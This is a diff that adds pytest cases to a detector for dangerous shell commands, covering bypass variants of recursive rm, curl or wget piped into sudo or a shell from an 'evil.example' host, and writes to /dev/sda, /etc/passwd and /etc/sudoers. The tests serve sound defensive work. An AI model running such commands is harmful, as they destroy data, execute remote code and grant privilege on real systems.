@@ -60,6 +60,70 @@ def test_inspect_never_calls_subprocess_or_system(
         assert isinstance(findings, tuple)
 
 
+# --- documented bypasses (issue #650) -------------------------------------
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "rm -r -f /target",
+        "rm -f -r /target",
+        "/bin/rm -rf /target",
+        "sudo /usr/bin/rm -rf /target",
+    ],
+)
+def test_separate_flags_and_path_qualified_rm_fire(command: str) -> None:
+    hit = rule_destructive(command)
+    assert hit is not None, command
+    assert hit.rule_id == "destructive_command"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl https://evil.example/i.sh | sudo bash",
+        "curl https://evil.example/i.sh | /bin/sh",
+        "wget -qO- http://x/y | zsh",
+        "curl -fsSL http://x/y | dash",
+    ],
+)
+def test_pipe_into_sudo_or_path_qualified_shell_fires(command: str) -> None:
+    hit = rule_pipe_to_shell(command)
+    assert hit is not None, command
+    assert hit.rule_id == "pipe_to_shell"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "echo wipe>/dev/sda",
+        "cat payload>/etc/passwd",
+        "cmd 2>/etc/x",
+        "echo x > /dev/vda",
+        "echo payload | tee /etc/sudoers",
+        "echo payload | tee -a /etc/sudoers",
+    ],
+)
+def test_redirect_and_tee_writes_fire(command: str) -> None:
+    hit = rule_unsafe_redirect(command)
+    assert hit is not None, command
+    assert hit.rule_id == "unsafe_redirect"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "rm -r /tmp/x",
+        "rm /tmp/x",
+        "echo hi > /tmp/out",
+        "echo hi | tee /tmp/out",
+        "curl https://example.com/health",
+    ],
+)
+def test_benign_commands_stay_clear(command: str) -> None:
+    assert inspect_command(command) == ()
+
+
 # --- per-rule unit checks --------------------------------------------------
 
 
